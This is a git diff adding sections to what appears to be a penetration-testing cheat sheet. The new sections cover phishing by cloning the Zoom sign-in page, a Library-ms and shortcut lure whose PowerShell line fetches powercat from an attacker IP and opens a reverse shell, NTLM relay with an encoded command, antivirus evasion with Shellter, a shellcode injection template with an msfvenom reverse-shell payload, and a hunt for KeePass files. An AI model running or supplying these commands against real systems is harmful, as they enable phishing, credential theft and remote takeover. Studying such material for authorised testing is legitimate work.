@@ -12,7 +12,7 @@ Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw
 <details>
 <summary> google dorking </summary>
 
-you know what this is.
+https://www.exploit-db.com/google-hacking-database
 </details>
 
 <details>
@@ -147,6 +147,78 @@ snmpwalk -c public -v1 -t 10 192.168.50.151
 ```
 </details>
 
+## Phishing
+
+<details>
+<summary> Website Cloning </summary>
+
+We’ll use -E to adjust file extensions to match MIME types, -k to convert links to local copies, and -K to save originals with a .orig extension. With -p, we’ll grab all assets needed to view the page. The -e robots=off option ignores robots.txt. We’ll allow external host downloads with -H, but restrict them to the zoom.us domain via -Dzoom.us. Finally, -nd saves everything in a flat directory in the current working directory.
+
+```bash
+wget -E -k -K -p -e robots=off -H -Dzoom.us -nd "https://zoom.us/signin#/login"
+```
+</details>
+
+<details>
+<summary> config.Library-ms </summary>
+
+setup a webdav listener on the attacking machine
+
+```bash 
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+```
+
+create a file named 'config.Library-ms' with the following contents:
+``` xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.119.2</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+create a .lnk file, entering the following into the input field and name it 'automatic_configuration'
+``` powershell
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
+powercat -c 192.168.119.3 -p 4444 -e powershell"
+```
+
+Next, we'll start the Python3 web server on port 8000 to serve powercat.ps1, WsgiDAV for our WebDAV share to serve the the automatic_configuration.lnk and config.Library-ms files, and a Netcat listener on port 4444 to catch the reverse shell.
+
+```bash
+# download powercat
+wget https://github.com/besimorhino/powercat/raw/refs/heads/master/powercat.ps1
+
+python3 -m http.server
+```
+
+copy the automatic_configuration.lnk and config.Library-ms to WebDAV directory. In a normal assessment we would most likely send the library file via email but for this example, we'll use the \\192.168.50.195\share SMB share to simulate the delivery step.
+
+To upload the library file to the SMB share, we'll use smbclient with the -c parameter to specify the put config.Library-ms command. Before we execute smbclient, we need to change our current directory to the library file's directory. We'll also delete the previously created test.txt file from the WebDAV share.
+
+``` bash
+cd ~/webdav
+
+smbclient //192.168.50.195/share -c 'put config.Library-ms'
+```
+
+
+</details>
+
 ## Password Attacks
 
 <details>
@@ -200,7 +272,12 @@ nxe.exe -u "C:\usernames.txt" -p "C:\passwords.txt" -d domain.com --continue-on-
 <details>
 <summary> hashcat </summary>
 
+Effective rulesets can be found in ```/usr/share/hashcat/rules```
+
 ``` bash
+# use some rules against a password list 
+hashcat -r demo2.rule --stdout demo.txt
+
 # crack kerberos TGS-REP hash (output from GetUserSPNs.py) and append 4 digits to the passwords 
 hashcat -m 13100 -a 6 hashfile.txt passwordlist.txt ?d?d?d?d
 ```
@@ -241,6 +318,9 @@ smbexec.py domain.com/username:password@10.13.12.3 -dc-ip 10.10.192.10
 
 # execute code using wmic
 wmiexec.py domain.com/username:password@10.13.12.3 -dc-ip 10.10.192.10
+
+# setup an smb listenter, and run a command on a target using captured hash
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
 ```
 </details>
 
@@ -386,7 +466,55 @@ use 1b
 ```
 </details>
 
-## Evasion 
+## Evasion
+
+<details>
+<summary> shellter </summary>
+
+Shellter is a dynamic shellcode injection tool and one of the most popular free tools capable of bypassing antivirus software.
+
+``` bash
+apt-cache search shellter
+sudo apt install shellter
+sudo apt install wine
+sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+
+# If we are using an ARM processor, we need to a slightly different set of commands.
+sudo apt install wine
+sudo dpkg --add-architecture amd64
+sudo  apt install -y qemu-user-static binfmt-support
+sudo apt-get update && apt-get install wine32
+```
+</details>
+
+<details>
+<summary> Powershell Memory Injection </summary>
+
+A basic templated script that performs in-memory injection is shown in the listing below. The script starts by importing VirtualAlloc and CreateThread from kernel32.dll as well as memset from msvcrt.dll. These functions will allow us to allocate memory, create an execution thread, and write arbitrary data to the allocated memory, respectively. We will allocate the memory and execute a new thread in the current process (powershell.exe), rather than a remote one.
+
+``` powershell
+# run this within the x86 version of powershell
+$code = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+<place shellcode here>
+
+```
+Generate powershell reflection shellcode 
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f psh-reflection
+```
+
+</details>
+
 <details>
 <summary> msbuild.exe </summary>
 
@@ -598,6 +726,9 @@ setspn.exe -T * -Q */*
 
 rem use sysinternals adexplorer to fetch active directory information
 ADExplorer.exe 
+
+rem look for keepass database
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 ```
 
 ### Microsoft Management Console
